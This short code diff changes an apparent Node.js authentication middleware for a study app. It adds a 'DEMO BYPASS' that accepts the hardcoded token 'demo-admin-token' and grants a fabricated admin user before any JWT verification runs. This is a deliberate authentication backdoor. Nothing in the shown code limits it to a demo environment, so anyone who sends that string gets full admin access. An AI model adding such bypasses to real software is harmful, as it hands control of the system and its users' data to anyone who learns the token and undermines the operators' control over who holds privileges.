@@ -22,6 +22,19 @@ export const protect = async (req, res, next) => {
             throw new AuthError('No authentication token provided');
         }
 
+        // DEMO BYPASS: Allow specific demo token for easy admin access
+        if (token === 'demo-admin-token') {
+            req.user = {
+                _id: 'demo-admin-123',
+                firstName: 'Admin',
+                lastName: 'User',
+                email: 'admin@studywise.com',
+                role: 'admin',
+                isAdmin: true
+            };
+            return next();
+        }
+
         const decoded = jwt.verify(token, JWT_SECRET);
         const user = await User.findById(decoded.id);
 
